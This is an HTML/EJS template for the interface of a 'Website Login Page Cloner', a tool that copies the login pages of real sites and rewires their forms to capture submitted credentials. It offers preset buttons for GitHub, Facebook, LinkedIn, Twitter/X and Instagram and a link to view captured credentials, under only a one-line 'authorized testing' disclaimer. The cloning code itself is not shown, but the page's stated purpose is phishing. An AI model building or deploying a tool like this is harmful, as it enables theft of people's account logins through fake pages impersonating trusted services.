<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><%= title %></title>
  <link rel="stylesheet" href="/css/style.css">
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🌐</text></svg>">
</head>
<body>
  <div class="container">
    <header class="header">
      <div class="logo"><span class="logo-icon">🌐</span></div>
      <h1 class="title">Website Login Page Cloner</h1>
      <p class="subtitle">Clone any website login page - Captures credentials automatically</p>
      <div class="version-badge">v1 - With Credential Capture</div>
    </header>

    <main class="main">
      <div class="card">
        <div class="card-header">
          <h2 class="card-title">⚙️ Configuration</h2>
          <p class="card-desc">Enter the website URL to clone</p>
        </div>
        <form id="cloneForm" class="form">
          <div class="form-group">
            <label class="label" for="url">🌐 Website URL</label>
            <input type="text" id="url" name="url" class="input" placeholder="https://example.com/login" required>
          </div>
          <div class="form-group">
            <label class="label" for="action">➡️ Form Action URL</label>
            <input type="text" id="action" name="action" class="input" placeholder="/login" value="/login">
            <p class="hint">Form will submit to this endpoint. Default: <code>/login</code> captures credentials</p>
          </div>
          <div class="form-group">
            <label class="label">🚀 Render Mode</label>
            <div class="radio-group">
              <label class="radio-label">
                <input type="radio" name="renderMode" value="auto" checked>
                <span><strong>Auto</strong> - Try fetch first, fallback to Puppeteer</span>
              </label>
              <label class="radio-label">
                <input type="radio" name="renderMode" value="puppeteer">
                <span><strong>Puppeteer</strong> - Render JavaScript (slower, more sites)</span>
              </label>
              <label class="radio-label">
                <input type="radio" name="renderMode" value="fetch">
                <span><strong>Fetch Only</strong> - Fast, HTML-only</span>
              </label>
            </div>
          </div>
          <div class="form-group" id="waitTimeGroup" style="display: none;">
            <label class="label" for="waitTime">⏱️ JavaScript Wait Time (ms)</label>
            <input type="number" id="waitTime" name="waitTime" class="input" value="5000" min="1000" max="30000" step="1000">
            <p class="hint">Time to wait for JavaScript to render (default: 5000ms)</p>
          </div>
          <div class="form-group checkbox-group">
            <label class="checkbox-label">
              <input type="checkbox" id="modifyAllForms" name="modifyAllForms">
              <span>Modify all forms (not just login forms)</span>
            </label>
          </div>
          <% if (error) { %><div class="alert alert-error">❌ <%= error %></div><% } %>
          <% if (success) { %><div class="alert alert-success">✅ <%= success %></div><% } %>
          <div class="button-group">
            <button type="submit" class="btn btn-primary" id="cloneBtn">⚡ Clone Website</button>
          </div>
        </form>
      </div>

      <div class="card">
        <div class="card-header">
          <h2 class="card-title">📄 Results</h2>
          <p class="card-desc">View, preview, and download the cloned login page</p>
        </div>
        <div id="results">
          <div id="initialState" class="initial-state">
            <div class="empty-icon">📄</div>
            <p>Enter a URL and click "Clone Website" to get started</p>
          </div>
          <div id="loadingState" class="loading-state" style="display: none;">
            <div class="spinner"></div>
            <p id="loadingText">Cloning website...</p>
          </div>
          <div id="successState" class="success-state" style="display: none;">
            <div class="alert alert-success">✅ Website cloned successfully!</div>
            <div id="renderMethodBadge" class="render-method"></div>
            <div class="stats">
              <div class="stat-card">
                <span class="stat-label">Forms Modified</span>
                <span class="stat-value" id="formsCount">0</span>
              </div>
              <div class="stat-card">
                <span class="stat-label">File Size</span>
                <span class="stat-value" id="fileSize">0 KB</span>
              </div>
            </div>
            <div id="formsList" class="forms-list"></div>
            <div class="action-buttons">
              <button type="button" class="btn btn-blue" id="previewBtn">👁️ Preview & Test</button>
              <button type="button" class="btn btn-green" id="downloadBtn">⬇️ Download HTML</button>
              <button type="button" class="btn btn-secondary" id="copyBtn">📋 Copy Code</button>
            </div>
          </div>
          <div id="errorState" class="error-state" style="display: none;">
            <div class="alert alert-error" id="errorMessage">❌ An error occurred</div>
          </div>
        </div>
      </div>
    </main>

    <div class="quick-sites">
      <h3>🚀 Quick Test Sites</h3>
      <div class="quick-buttons">
        <button type="button" class="btn btn-small btn-secondary quick-btn" data-url="https://github.com/login">GitHub</button>
        <button type="button" class="btn btn-small btn-secondary quick-btn" data-url="https://www.facebook.com">Facebook</button>
        <button type="button" class="btn btn-small btn-secondary quick-btn" data-url="https://www.linkedin.com/login">LinkedIn</button>
        <button type="button" class="btn btn-small btn-secondary quick-btn" data-url="https://twitter.com/login" data-puppeteer="true">Twitter/X</button>
        <button type="button" class="btn btn-small btn-secondary quick-btn" data-url="https://www.instagram.com/accounts/login/" data-puppeteer="true">Instagram</button>
      </div>
    </div>

    <footer class="footer">
      <hr class="divider">
      <div class="footer-links">
        <a href="/credentials" class="footer-link">🔐 View Captured Credentials</a>
      </div>
      <p class="footer-text">⚠️ For authorized testing and educational purposes only</p>
    </footer>
  </div>

  <div id="previewModal" class="modal">
    <div class="modal-content">
      <div class="modal-header">
        <h3 class="modal-title">👁️ Preview - Test Login Form</h3>
        <div class="modal-actions">
          <button type="button" class="btn btn-small btn-secondary" id="openNewTabBtn">🔗 Open in New Tab</button>
          <button type="button" class="btn btn-small btn-close" id="closeModalBtn">✕</button>
        </div>
      </div>
      <div class="modal-body">
        <iframe id="previewFrame" class="preview-frame" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
      </div>
    </div>
  </div>

  <script src="/js/app.js"></script>
</body>
</html>
